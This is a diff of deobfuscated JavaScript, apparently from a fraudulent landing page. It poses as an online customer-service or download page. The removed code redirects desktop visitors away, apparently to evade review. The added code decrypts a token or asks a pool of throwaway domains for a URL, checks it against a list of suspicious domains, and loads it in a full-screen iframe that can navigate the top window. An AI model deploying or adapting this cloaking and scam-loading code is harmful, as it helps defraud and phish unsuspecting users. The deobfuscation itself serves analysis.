@@ -1,48 +1,161 @@
-//Tue Oct 14 2025 14:08:52 GMT+0000 (Coordinated Universal Time)
+//Tue Oct 28 2025 14:01:02 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && /^(Win|Mac)/i.test(navigator.platform)) {
-  location.href = "HamooBCkUB/" + new Date().getTime();
-  throw SyntaxError();
-}
-var turl = ["https://cdn.gbot.qq.com/miniapp/gbot-1258344700/aiphotos-users/066c734323f8301fdb9099151e982ea3cb35577b77f63880b799fcf97217fe2780f399f1f02fa14d.jpg?{wwnmmnn}"];
-if (getVideoid("t") !== false) var urls = turl;else var urls = turl;
-document.addEventListener("DOMContentLoaded", function () {
-  const _0x42569a = document.getElementsByTagName("iframe")[0];
-  setTimeout(function () {
-    _0x42569a && (_0x42569a.style.display = "none");
-  }, 1200);
-});
-function callQQback() {
-  var _0xd9dbb3 = myChat(urls);
-  _0xd9dbb3 = syncUrlParams(window.location.href, _0xd9dbb3);
-  window.open(_0xd9dbb3, "_blank");
-}
-function myChat(_0x1b37ac) {
-  return _0x1b37ac = typeof _0x1b37ac == "object" ? _0x1b37ac[Math.floor(Math.random() * _0x1b37ac.length)] : _0x1b37ac, _0x1b37ac.replace(/\{(\w+?)\}/g, function (_0x3f2f29, _0x5e7705) {
-    var _0x27ad0e = "";
-    _0x5e7705 = _0x5e7705.toUpperCase();
-    for (var _0x2f24aa = 0; _0x2f24aa < _0x5e7705.length; _0x2f24aa++) {
-      if ("N" == _0x5e7705[_0x2f24aa]) _0x27ad0e += Math.floor(Math.random() * 10);else "D" == _0x5e7705[_0x2f24aa] ? _0x27ad0e += String.fromCharCode(65 + Math.floor(Math.random() * 26)) : _0x27ad0e += String.fromCharCode(97 + Math.floor(Math.random() * 26));
+(function () {})();
+window.onload = async function () {
+  try {
+    let _0x377698 = false;
+    const _0x34f74c = await this.getFrameUrl();
+    !_0x34f74c.msg && (_0x377698 = true);
+    var _0x3d3231 = _0x34f74c.msg || _0x34f74c;
+    document.body.style.display = "flex";
+    var _0x11b800 = getQueryString("title");
+    _0x11b800 ? window.document.title = _0x11b800 : window.document.title = "在线客服";
+    var _0xde6154 = getQueryString("icon") || "";
+    if (_0xde6154) {
+      _0xde6154 = decodeURIComponent(_0xde6154);
     }
-    return _0x27ad0e;
-  });
-}
-function syncUrlParams(_0x191504, _0x6469b) {
-  const _0x465314 = new URL(_0x191504),
-    _0x406b7a = new URL(_0x6469b);
-  for (const [_0x3b6c85, _0x57471e] of _0x465314.searchParams.entries()) {
-    !_0x406b7a.searchParams.has(_0x3b6c85) && _0x406b7a.searchParams.append(_0x3b6c85, _0x57471e);
+    var _0x1ad780 = getQueryString("desc");
+    !_0x1ad780 && (_0x1ad780 = "点击下载找额");
+    setOrCreateElement("meta", {
+      "name": "description"
+    }, "content", _0x1ad780);
+    setOrCreateElement("link", {
+      "rel": "icon"
+    }, "href", _0xde6154);
+    setOrCreateElement("link", {
+      "rel": "bookmark",
+      "type": "image/x-icon"
+    }, "href", _0xde6154);
+    setOrCreateElement("link", {
+      "rel": "shortcut icon",
+      "type": "image/x-icon"
+    }, "href", _0xde6154);
+    !_0x3d3231 && (_0x3d3231 = getQueryString("token"));
+    if (!_0x3d3231) {
+      return;
+    }
+    _0x3d3231 = decodeURIComponent(_0x3d3231);
+    var _0x469baf = _0x377698 ? xorDecrypt(_0x3d3231) : _0x3d3231;
+    if (isHttpOrHttpsUrl(_0x469baf)) {
+      if (_0x377698) {
+        const _0x524dcd = new URL(_0x469baf).hostname;
+        if (!_0x524dcd.includes(".baiwe.site") && !_0x524dcd.includes(".kokol.site") && !_0x524dcd.includes(".quiky.site") && !_0x524dcd.includes(".wokui.icu") && !_0x524dcd.includes(".plushs.club") && !_0x524dcd.includes(".jdshp.shop") && !_0x524dcd.includes(".tengcs.cn") && !_0x524dcd.includes(".xyus.top") && !_0x524dcd.includes(".nikue.top") && !_0x524dcd.includes(".timisl.work") && !_0x524dcd.includes(".asptymgl.top") && !_0x524dcd.includes(".dxptyms.top")) {
+          return;
+        }
+      }
+      const _0x19273e = document.documentElement.clientHeight,
+        _0x4deb7c = document.createElement("iframe");
+      _0x4deb7c.onload = function () {
+        document.getElementById("dnrhca").style.display = "none";
+      };
+      _0x4deb7c.src = _0x469baf;
+      _0x4deb7c.frameBorder = "0";
+      _0x4deb7c.scrolling = "auto";
+      _0x4deb7c.style.width = "100%";
+      _0x4deb7c.style.height = _0x19273e;
+      _0x4deb7c.style.border = "none";
+      _0x4deb7c.style.zIndex = "9999";
+      _0x4deb7c.sandbox = "allow-same-origin allow-scripts allow-top-navigation allow-forms allow-popups";
+      document.getElementById("overlay").appendChild(_0x4deb7c);
+    }
+  } catch (_0x1bc739) {}
+};
+function setOrCreateElement(_0x365382, _0x3309c3, _0x4a1c85 = null, _0x40f466 = null) {
+  let _0x3e4900 = _0x365382;
+  for (const [_0x45927b, _0x53949d] of Object.entries(_0x3309c3)) {
+    _0x3e4900 += "[" + _0x45927b + "=\"" + _0x53949d + "\"]";
   }
-  return _0x406b7a.toString();
-}
-function getVideoid(_0x28d82b) {
-  (function () {})();
-  var _0x4003bf = window.location.search.substring(1),
-    _0x51c6f3 = _0x4003bf.split("&");
-  for (var _0x438730 = 0; _0x438730 < _0x51c6f3.length; _0x438730++) {
-    var _0x32f9be = _0x51c6f3[_0x438730].split("=");
-    if (_0x32f9be[0] == _0x28d82b) return _0x32f9be[1];
+  let _0x172761 = document.querySelector(_0x3e4900);
+  if (!_0x172761) {
+    _0x172761 = document.createElement(_0x365382);
+    for (const [_0x154f2d, _0xbca33f] of Object.entries(_0x3309c3)) {
+      _0x172761.setAttribute(_0x154f2d, _0xbca33f);
+    }
+    document.head.appendChild(_0x172761);
   }
+  return _0x4a1c85 && _0x40f466 && (_0x172761[_0x4a1c85] = _0x40f466), _0x172761;
+}
+function getQueryString(_0x32bf95) {
+  var _0x1b13e3 = new RegExp("(^|&)" + _0x32bf95 + "=([^&]*)(&|$)"),
+    _0x3b249c = window.location.search.substr(1).match(_0x1b13e3);
+  if (_0x3b249c != null) return decodeURI(_0x3b249c[2]);
+  return "";
+}
+function isHttpOrHttpsUrl(_0x45c9ea) {
+  if (typeof _0x45c9ea !== "string") return false;
+  if (_0x45c9ea.startsWith("http://") || _0x45c9ea.startsWith("https://")) return true;
   return false;
+}
+function xorDecrypt(_0x31201d) {
+  let _0x34d0e0 = "gotojiam",
+    _0x5a5448 = atob(_0x31201d),
+    _0x22a60f = "",
+    _0x1cae0f = _0x34d0e0.length;
+  for (let _0x215a3d = 0; _0x215a3d < _0x5a5448.length; _0x215a3d++) {
+    let _0x1f656c = String.fromCharCode(_0x5a5448.charCodeAt(_0x215a3d) ^ _0x34d0e0.charCodeAt(_0x215a3d % _0x1cae0f));
+    _0x22a60f += _0x1f656c;
+  }
+  return _0x22a60f;
+}
+async function getFrameUrl() {
+  var _0x5d59d7 = getQueryString("d");
+  const _0x38fdf1 = _0x5d59d7.substring(_0x5d59d7.length - 2, _0x5d59d7.length);
+  _0x38fdf1 < 100 && _0x38fdf1 >= 10 && (_0x5d59d7 = _0x5d59d7.substring(0, _0x5d59d7.length - 2));
+  if (!_0x5d59d7) {
+    return;
+  }
+  if (_0x5d59d7.length < 15) {
+    let _0x1b0406 = domainPool()[_0x38fdf1] || "";
+    return _0x5d59d7 = this.ultraDecrypt(_0x5d59d7), new Promise((_0x3f4ae7, _0x147ce5) => {
+      console.log("url", _0x1b0406);
+      const _0x59cbbc = new XMLHttpRequest();
+      _0x1b0406 = _0x1b0406 + "/api/getFrameUrl/" + _0x5d59d7;
+      _0x59cbbc.open("POST", _0x1b0406, true);
+      _0x59cbbc.setRequestHeader("Content-Type", "application/json");
+      _0x59cbbc.onload = function () {
+        if (_0x59cbbc.status === 200) {
+          _0x3f4ae7(JSON.parse(_0x59cbbc.responseText));
+        } else _0x147ce5(_0x59cbbc.statusText);
+      };
+      _0x59cbbc.onerror = function () {
+        _0x147ce5(_0x59cbbc.statusText);
+      };
+      _0x59cbbc.send();
+    });
+  } else return _0x5d59d7;
+}
+function ultraDecrypt(_0xabd007) {
+  const _0x2367f5 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
+  if (_0xabd007.length < 2) return _0xabd007;
+  const _0x59d587 = parseInt(_0xabd007[0]);
+  let _0x62ff32 = "";
+  for (let _0xece622 = 1; _0xece622 < _0xabd007.length; _0xece622++) {
+    const _0x4d12d2 = _0xabd007[_0xece622],
+      _0x146e52 = _0x2367f5.indexOf(_0x4d12d2);
+    if (_0x146e52 !== -1) {
+      let _0x59b233 = (_0x146e52 - _0x59d587) % _0x2367f5.length;
+      _0x59b233 < 0 && (_0x59b233 += _0x2367f5.length);
+      _0x62ff32 += _0x2367f5[_0x59b233];
+    } else _0x62ff32 += _0x4d12d2;
+  }
+  return _0x62ff32;
+}
+function domainPool() {
+  const _0x89e1db = window.location.href;
+  let _0x3e5a00 = _0x89e1db.startsWith("https://") ? "https://" : "http://";
+  return {
+    "10": _0x3e5a00 + "ansgl.longshengyun.top",
+    "11": _0x3e5a00 + "ayglis.alyaiee.site",
+    "12": _0x3e5a00 + "dxgls.longshengyun.top",
+    "13": _0x3e5a00 + "gnkks.uhgqhmyl.top",
+    "14": _0x3e5a00 + "fyxts.fykfcn.top",
+    "15": _0x3e5a00 + "sykks.s035ys.cn",
+    "16": _0x3e5a00 + "wkks.w874ny.cn",
+    "17": _0x3e5a00 + "wykks.w931ym.cn",
+    "18": _0x3e5a00 + "xwkks.pfisxm.top",
+    "19": _0x3e5a00 + "kkzhs.zcpfcdh.shop",
+    "20": _0x3e5a00 + "kkgl.wenyms.top",
+    "21": _0x3e5a00 + "kkgl.extlx.top"
+  };
 }
